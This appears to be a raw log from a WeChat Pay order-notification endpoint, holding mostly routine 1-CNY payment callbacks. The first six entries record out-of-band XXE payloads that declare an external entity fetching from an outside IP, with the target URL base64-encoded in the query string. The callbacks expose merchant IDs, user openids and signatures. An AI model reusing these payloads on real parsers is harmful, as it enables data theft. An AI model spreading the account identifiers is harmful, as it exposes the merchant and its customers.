03:16:36|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:16:36|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:25:13|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:25:14|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:32:44|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:32:44|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071703_85?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
19:20:54|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[HXB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f048f8ea04]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[264061670644664001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[DC14CFE96AAE591B63A604EE877A7961]]></sign>
<time_end><![CDATA[20190717192053]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000342201907175620923266]]></transaction_id>
</xml>'
| GET:array (
)
19:20:54|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'HXB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f048f8ea04',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '264061670644664001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'DC14CFE96AAE591B63A604EE877A7961',
  'time_end' => '20190717192053',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000342201907175620923266',
)
| GET:array (
)
19:22:06|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[HXB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f04d76a7fa]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[252061670651845701301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[04AFB7ACA7B331C8B142F2DBC0416846]]></sign>
<time_end><![CDATA[20190717192205]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000355201907178864249798]]></transaction_id>
</xml>'
| GET:array (
)
19:22:06|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'HXB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f04d76a7fa',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '252061670651845701301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '04AFB7ACA7B331C8B142F2DBC0416846',
  'time_end' => '20190717192205',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000355201907178864249798',
)
| GET:array (
)
20:36:33|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f163f37da5]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[276061671097435804701]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[61ACE1E0E9EEA22787BECD5D2B02DC00]]></sign>
<time_end><![CDATA[20190717203632]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000357201907176903155251]]></transaction_id>
</xml>'
| GET:array (
)
20:36:33|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f163f37da5',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '276061671097435804701',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '61ACE1E0E9EEA22787BECD5D2B02DC00',
  'time_end' => '20190717203632',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000357201907176903155251',
)
| GET:array (
)
20:45:07|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f1844ee965]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[259061671149202403201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[08C4A59FF8FF000170E32922452AD7CC]]></sign>
<time_end><![CDATA[20190717204506]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000354201907172792121762]]></transaction_id>
</xml>'
| GET:array (
)
20:45:07|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f1844ee965',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '259061671149202403201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '08C4A59FF8FF000170E32922452AD7CC',
  'time_end' => '20190717204506',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000354201907172792121762',
)
| GET:array (
)
20:50:19|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f197b5b378]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[285061671180239503201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2E6A585C48DE919D8D2510400B99FB43]]></sign>
<time_end><![CDATA[20190717205018]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000350201907177444974355]]></transaction_id>
</xml>'
| GET:array (
)
20:50:19|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f197b5b378',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '285061671180239503201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2E6A585C48DE919D8D2510400B99FB43',
  'time_end' => '20190717205018',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000350201907177444974355',
)
| GET:array (
)
20:53:10|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f1a31084d2]]></nonce_str>
<openid><![CDATA[oGq4g5bkquJ8yJzXYqMgNivlWvpk]]></openid>
<out_trade_no><![CDATA[262061671198278304901]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[5405DF6DF2C381B7E3F90C20C30FA726]]></sign>
<time_end><![CDATA[20190717205309]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000348201907174341825027]]></transaction_id>
</xml>'
| GET:array (
)
20:53:10|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f1a31084d2',
  'openid' => 'oGq4g5bkquJ8yJzXYqMgNivlWvpk',
  'out_trade_no' => '262061671198278304901',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '5405DF6DF2C381B7E3F90C20C30FA726',
  'time_end' => '20190717205309',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000348201907174341825027',
)
| GET:array (
)
20:53:27|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f1a35aece9]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[254061671198877003201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2A71B93AAE2B47302109F486FEE82C1E]]></sign>
<time_end><![CDATA[20190717205326]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000347201907177494739518]]></transaction_id>
</xml>'
| GET:array (
)
20:53:27|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f1a35aece9',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '254061671198877003201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2A71B93AAE2B47302109F486FEE82C1E',
  'time_end' => '20190717205326',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000347201907177494739518',
)
| GET:array (
)
21:00:19|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2f1bd1a0183]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[219061671240084703201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[11F8C4E74E78F56519BC3D8DCEB1384B]]></sign>
<time_end><![CDATA[20190717210017]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000346201907174110587963]]></transaction_id>
</xml>'
| GET:array (
)
21:00:19|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2f1bd1a0183',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '219061671240084703201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '11F8C4E74E78F56519BC3D8DCEB1384B',
  'time_end' => '20190717210017',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000346201907174110587963',
)
| GET:array (
)
